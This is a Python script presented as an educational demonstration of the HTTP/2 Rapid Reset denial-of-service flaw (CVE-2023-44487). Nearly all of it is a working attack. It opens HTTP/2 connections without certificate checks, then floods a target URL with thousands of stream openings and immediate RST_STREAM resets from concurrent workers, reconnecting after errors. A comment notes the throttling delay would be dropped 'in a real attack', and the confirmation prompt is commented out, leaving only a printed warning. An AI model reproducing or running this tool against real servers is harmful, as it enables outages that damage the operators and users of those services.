#!/usr/bin/env python3

import ssl
import sys
import argparse
import time
import concurrent.futures
import socket
from datetime import datetime
from urllib.parse import urlparse
from http.client import HTTPConnection, HTTPSConnection

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import WindowUpdated, RemoteSettingsChanged

import httpx
import requests
import urllib3

# Disable SSL warnings - Add this for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_source_ips(proxies):
    """
    Retrieve the internal and external IP addresses of the machine.
    """
    try:
        response = requests.get('http://ifconfig.me', timeout=5, proxies=proxies)
        external_ip = response.text.strip()

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        try:
            s.connect(('8.8.8.8', 1))
            internal_ip = s.getsockname()[0]
        except socket.timeout:
            internal_ip = '127.0.0.1'
        except Exception as e:
            internal_ip = '127.0.0.1'
        finally:
            s.close()
        
        return internal_ip, external_ip
    except requests.exceptions.Timeout:
        print("External IP request timed out.")
        return None, None
    except Exception as e:
        print(f"Error: {e}")
        return None, None
    
def check_http2_support(url, proxies):
    """
    Check if the given URL supports HTTP/2.
    """
    try:
        # Update the proxies dictionary locally within this function
        local_proxies = {}
        if proxies:
            local_proxies = {
                'http://': proxies['http'],
                'https://': proxies['https'],
            }
        
        # Use the proxy if set, otherwise don't
        client_options = {
            'http2': True, 
            'verify': False,  # Ignore SSL verification
            'timeout': 10.0   # Increase timeout
        }
        
        if local_proxies:
            client_options['proxies'] = local_proxies
        
        # First try with httpx
        try:
            with httpx.Client(**client_options) as client:
                response = client.get(url)
            
            if response.http_version == 'HTTP/2':
                return (1, "")
            else:
                return (0, f"{response.http_version}")
        except Exception as httpx_error:
            print(f"HTTPX Error: {httpx_error}. Trying curl fallback...")
            
            # Fallback to curl if httpx fails
            import subprocess
            try:
                result = subprocess.run(
                    ["curl", "-kv", "--http2", url], 
                    capture_output=True, 
                    text=True
                )
                if "Using HTTP2" in result.stderr or "HTTP/2" in result.stderr:
                    return (1, "")
                else:
                    return (0, "HTTP/2 not detected in curl output")
            except Exception as curl_error:
                return (-1, f"Both HTTPX and curl failed: {curl_error}")
                
    except Exception as e:
        return (-1, f"check_http2_support - {e}")

def create_h2_connection(host, port, proxy=None, timeout=10):
    """
    Create an HTTP/2 connection to the specified host.
    """
    # Create an SSL context that ignores certificate verification
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    # Added to handle modern TLS requirements
    ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    ssl_context.set_ciphers("HIGH:!aNULL:!MD5:!RC4")

    # Create a connection based on whether a proxy is used
    if proxy and proxy != "":
        proxy_parts = urlparse(proxy)
        if port == 443:
            conn = HTTPSConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout, context=ssl_context)
            conn.set_tunnel(host, port)
        else:
            conn = HTTPConnection(proxy_parts.hostname, proxy_parts.port, timeout=timeout)
            conn.set_tunnel(host, port)
    else:
        if port == 443:
            conn = HTTPSConnection(host, port, timeout=timeout, context=ssl_context)
        else:
            conn = HTTPConnection(host, port, timeout=timeout)

    # Add debugging
    print(f"Connecting to {host}:{port}...")
    
    try:
        conn.connect()
        print("Connection established successfully")
    except Exception as e:
        print(f"Connection error: {e}")
        raise

    # Initiate HTTP/2 connection
    config = H2Configuration(client_side=True)
    h2_conn = H2Connection(config=config)
    h2_conn.initiate_connection()
    
    print("Sending initial HTTP/2 settings...")
    
    try:
        conn.send(h2_conn.data_to_send())
        print("Initial HTTP/2 settings sent successfully")
    except Exception as e:
        print(f"Error sending initial HTTP/2 settings: {e}")
        raise
    
    return conn, h2_conn, ssl_context

def rapid_reset_attack(host, port, num_resets=100, max_workers=10, uri_path='/', proxy=None, timeout=10):
    """
    Demonstrates a HTTP/2 Rapid Reset attack by creating multiple streams and resetting them.
    """
    if num_resets <= 0:
        return 0, 0, "Invalid number of resets"
    
    try:
        # Create initial connection
        print(f"Creating HTTP/2 connection to {host}:{port}...")
        conn, h2_conn, _ = create_h2_connection(host, port, proxy, timeout)
        
        # Send initial data to establish connection
        print("Receiving initial data...")
        try:
            data = conn.sock.recv(65535)
            print(f"Received {len(data)} bytes of initial data")
        except Exception as e:
            print(f"Error receiving initial data: {e}")
            return 0, 0, f"Error receiving initial data: {e}"
            
        events = h2_conn.receive_data(data)
        
        # Process initial server settings
        print(f"Processing {len(events)} initial events...")
        for event in events:
            if isinstance(event, (RemoteSettingsChanged, WindowUpdated)):
                print(f"Received event: {type(event).__name__}")
        
        success_count = 0
        total_attempts = 0
        
        print(f"Starting HTTP/2 Rapid Reset attack against {host}:{port}")
        print(f"Planning to send {num_resets} RST_STREAM frames using {max_workers} concurrent workers")
        
        start_time = time.time()
        
        # Create a ThreadPoolExecutor for concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            
            for i in range(num_resets):
                # Get the next available stream ID
                stream_id = h2_conn.get_next_available_stream_id()
                
                if i % 100 == 0:
                    print(f"Creating and resetting stream {i}/{num_resets}...")
                
                # Send headers to create a stream
                headers = [
                    (':method', 'GET'),
                    (':authority', host),
                    (':scheme', 'https'),
                    (':path', uri_path),
                ]
                
                try:
                    h2_conn.send_headers(stream_id, headers, end_stream=False)
                    conn.send(h2_conn.data_to_send())

                    # Immediately reset the stream
                    h2_conn.reset_stream(stream_id)
                    conn.send(h2_conn.data_to_send())

                    total_attempts += 1
                    success_count += 1
                except Exception as e:
                    print(f"Retrying on error: {e}")
                    time.sleep(0.5)
                    try:
                        # Create a new connection and try again
                        conn, h2_conn, _ = create_h2_connection(host, port, proxy, timeout)

                        # Continue with the next stream
                        total_attempts += 1
                    except Exception as reconnect_error:
                        print(f"Reconnection failed: {reconnect_error}")
                        total_attempts += 1
                
                # Small delay to avoid overwhelming local resources
                # In a real attack, this would be removed or minimized
                time.sleep(0.005)  # 1ms delay
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"Attack completed in {duration:.2f} seconds")
        print(f"Successfully sent {success_count}/{total_attempts} RST_STREAM frames")
        print(f"Average rate: {success_count/duration:.2f} resets per second")
        
        try:
            # Close the connection properly
            h2_conn.close_connection()
            conn.send(h2_conn.data_to_send())
            conn.close()
        except Exception as e:
            print(f"Error closing connection: {e}")
        
        return success_count, total_attempts, ""
    
    except Exception as e:
        return 0, 0, f"Error during rapid reset attack: {str(e)}"

def extract_hostname_port_uri(url):
    """
    Extract the hostname, port, and URI from a URL.
    """
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port
        scheme = parsed_url.scheme
        uri = parsed_url.path  # Extracting the URI
        if uri == "":
            uri = "/"

        if not hostname:
            return -1, -1, ""

        if port:
            return hostname, port, uri

        if scheme == 'http':
            return hostname, 80, uri

        if scheme == 'https':
            return hostname, 443, uri

        return hostname, (80, 443), uri
    except Exception as e:
        print(f"Error parsing URL: {e}")
        return -1, -1, ""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='HTTP/2 Rapid Reset (CVE-2023-44487) Demonstration Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-n', '--num_resets', type=int, default=10000,
                      help='Number of reset frames to send (default: 10000)')
    parser.add_argument('-w', '--workers', type=int, default=50,
                      help='Maximum number of concurrent workers (default: 50)')
    parser.add_argument('--proxy', help='HTTP/HTTPS proxy URL', default=None)
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-k', '--insecure', action='store_true', help='Allow insecure connections')
    parser.add_argument('--path', help='Custom URI path', default='/rapid-reset-test')
    args = parser.parse_args()

    # Check if HTTP/2 is supported
    print(f"[*] Checking if {args.url} supports HTTP/2...")
    
    proxies = {}
    if args.proxy:
        proxies = {
            'http': args.proxy,
            'https': args.proxy,
        }
        
    http2_support, err = check_http2_support(args.url, proxies)
    
    if http2_support != 1:
        if http2_support == 0:
            print(f"[!] Target does not support HTTP/2. Using {err}")
            print("[!] Trying to continue anyway with direct connection...")
        else:
            print(f"[!] Error checking HTTP/2 support: {err}")
            print("[!] Trying to continue anyway with direct connection...")
    else:
        print(f"[+] Target supports HTTP/2")
    
    # Extract hostname, port, and URI from the URL
    hostname, port, uri = extract_hostname_port_uri(args.url)
    
    # Use custom path if provided
    if args.path:
        uri = args.path
    
    if hostname == -1:
        print("[!] Invalid URL format")
        sys.exit(1)
    
    # Display a warning for educational use
    print("\n" + "!"*80)
    print("!! WARNING: This is an educational demonstration tool for CVE-2023-44487")
    print("!! It should ONLY be used in authorized testing environments")
    print("!! Using this against production servers without permission is illegal")
    print("!"*80 + "\n")
    
    # # Ask for confirmation before proceeding
    # confirm = input("Are you sure you want to continue? (yes/no): ")
    # if confirm.lower() not in ["yes", "y"]:
    #     print("Demonstration aborted.")
    #     sys.exit(0)
    
    print(f"\n[*] Starting HTTP/2 Rapid Reset attack against {hostname}:{port}")
    
    # Get source IP information
    internal_ip, external_ip = get_source_ips(proxies)
    print(f"[*] Source IPs - Internal: {internal_ip}, External: {external_ip}")
    
    # Run the attack
    success_count, total_attempts, error = rapid_reset_attack(
        hostname, port, args.num_resets, args.workers, uri, args.proxy, timeout=15)
    
    if error:
        print(f"[!] Attack encountered an error: {error}")
        if success_count > 0:
            print(f"[+] However, {success_count} reset frames were sent before the error occurred")
    else:
        print(f"\n[+] Attack completed:")
        print(f"    - Successfully sent {success_count}/{total_attempts} RST_STREAM frames")
        print(f"    - Target: {args.url}")
        print(f"    - Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        if success_count == total_attempts and total_attempts > 0:
            print("\n[+] The target appears to be vulnerable to CVE-2023-44487")
        else:
            print("\n[+] Not all reset frames were successfully sent, which may indicate some protection measures are in place")